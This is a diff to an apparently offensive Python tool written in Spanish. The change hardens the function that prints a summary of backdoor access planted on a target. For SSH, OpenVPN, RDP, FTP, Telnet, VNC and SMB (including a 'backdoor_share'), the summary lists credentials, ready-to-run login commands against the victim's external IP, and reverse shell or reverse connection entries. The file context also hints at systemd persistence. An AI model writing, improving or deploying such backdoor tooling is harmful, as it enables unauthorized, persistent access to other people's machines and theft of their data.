@@ -4239,51 +4239,74 @@ WantedBy=multi-user.target
                 print(f"   • {service_name.upper()} en puerto {port}")
                 
                 if service_name == 'ssh':
-                    print(f"     Usuario: {service['users'][0]['username']}")
-                    print(f"     Contraseña: {service['users'][0]['password']}")
-                    print(f"     Acceso: ssh {service['users'][0]['username']}@{external_ip} -p {port}")
+                    if 'users' in service and service['users']:
+                        print(f"     Usuario: {service['users'][0]['username']}")
+                        print(f"     Contraseña: {service['users'][0]['password']}")
+                        print(f"     Acceso: ssh {service['users'][0]['username']}@{external_ip} -p {port}")
+                    else:
+                        print(f"     Acceso: ssh {external_ip} -p {port}")
                     print(f"     Reverse Shell: {service.get('reverse_shell', 'N/A')}")
                     
                 elif service_name == 'openvpn':
-                    print(f"     Configuración: {service['clients'][0]['config_file']}")
-                    print(f"     Acceso: openvpn --config {service['clients'][0]['config_file']}")
+                    if 'clients' in service and service['clients']:
+                        print(f"     Configuración: {service['clients'][0]['config_file']}")
+                        print(f"     Acceso: openvpn --config {service['clients'][0]['config_file']}")
+                    else:
+                        print(f"     Acceso: openvpn --config client.ovpn")
                     print(f"     Reverse Connection: {service.get('reverse_connection', 'N/A')}")
                     
                 elif service_name == 'http':
-                    print(f"     Panel: {service['panel_url']}")
-                    print(f"     Usuario: {service['credentials']['username']}")
-                    print(f"     Contraseña: {service['credentials']['password']}")
-                    print(f"     Acceso: {service['access_methods'][0]}")
+                    print(f"     Panel: {service.get('panel_url', 'N/A')}")
+                    if 'credentials' in service and service['credentials']:
+                        print(f"     Usuario: {service['credentials']['username']}")
+                        print(f"     Contraseña: {service['credentials']['password']}")
+                    if 'access_methods' in service and service['access_methods']:
+                        print(f"     Acceso: {service['access_methods'][0]}")
                     print(f"     Reverse Proxy: {service.get('reverse_proxy', 'N/A')}")
                 
                 elif service_name == 'rdp':
-                    print(f"     Usuario: {service['users'][0]['username']}")
-                    print(f"     Contraseña: {service['users'][0]['password']}")
-                    print(f"     Acceso: xfreerdp /v:{external_ip}:{port} /u:{service['users'][0]['username']} /p:{service['users'][0]['password']}")
+                    if 'users' in service and service['users']:
+                        print(f"     Usuario: {service['users'][0]['username']}")
+                        print(f"     Contraseña: {service['users'][0]['password']}")
+                        print(f"     Acceso: xfreerdp /v:{external_ip}:{port} /u:{service['users'][0]['username']} /p:{service['users'][0]['password']}")
+                    else:
+                        print(f"     Acceso: xfreerdp /v:{external_ip}:{port}")
                     print(f"     Reverse Connection: {service.get('reverse_connection', 'N/A')}")
                 
                 elif service_name == 'ftp':
-                    print(f"     Usuario: {service['users'][0]['username']}")
-                    print(f"     Contraseña: {service['users'][0]['password']}")
-                    print(f"     Acceso: ftp {external_ip} {port}")
+                    if 'users' in service and service['users']:
+                        print(f"     Usuario: {service['users'][0]['username']}")
+                        print(f"     Contraseña: {service['users'][0]['password']}")
+                        print(f"     Acceso: ftp {external_ip} {port}")
+                    else:
+                        print(f"     Acceso: ftp {external_ip} {port}")
                     print(f"     Reverse Connection: {service.get('reverse_connection', 'N/A')}")
                 
                 elif service_name == 'telnet':
-                    print(f"     Usuario: {service['users'][0]['username']}")
-                    print(f"     Contraseña: {service['users'][0]['password']}")
-                    print(f"     Acceso: telnet {external_ip} {port}")
+                    if 'users' in service and service['users']:
+                        print(f"     Usuario: {service['users'][0]['username']}")
+                        print(f"     Contraseña: {service['users'][0]['password']}")
+                        print(f"     Acceso: telnet {external_ip} {port}")
+                    else:
+                        print(f"     Acceso: telnet {external_ip} {port}")
                     print(f"     Reverse Connection: {service.get('reverse_connection', 'N/A')}")
                 
                 elif service_name == 'vnc':
-                    print(f"     Usuario: {service['users'][0]['username']}")
-                    print(f"     Contraseña: {service['users'][0]['password']}")
-                    print(f"     Acceso: vncviewer {external_ip}:{port}")
+                    if 'users' in service and service['users']:
+                        print(f"     Usuario: {service['users'][0]['username']}")
+                        print(f"     Contraseña: {service['users'][0]['password']}")
+                        print(f"     Acceso: vncviewer {external_ip}:{port}")
+                    else:
+                        print(f"     Acceso: vncviewer {external_ip}:{port}")
                     print(f"     Reverse Connection: {service.get('reverse_connection', 'N/A')}")
                 
                 elif service_name == 'smb':
-                    print(f"     Usuario: {service['users'][0]['username']}")
-                    print(f"     Contraseña: {service['users'][0]['password']}")
-                    print(f"     Acceso: smbclient //{external_ip}/backdoor_share -U {service['users'][0]['username']}%{service['users'][0]['password']}")
+                    if 'users' in service and service['users']:
+                        print(f"     Usuario: {service['users'][0]['username']}")
+                        print(f"     Contraseña: {service['users'][0]['password']}")
+                        print(f"     Acceso: smbclient //{external_ip}/backdoor_share -U {service['users'][0]['username']}%{service['users'][0]['password']}")
+                    else:
+                        print(f"     Acceso: smbclient //{external_ip}/backdoor_share")
                     print(f"     Reverse Connection: {service.get('reverse_connection', 'N/A')}")
                 
                 print()
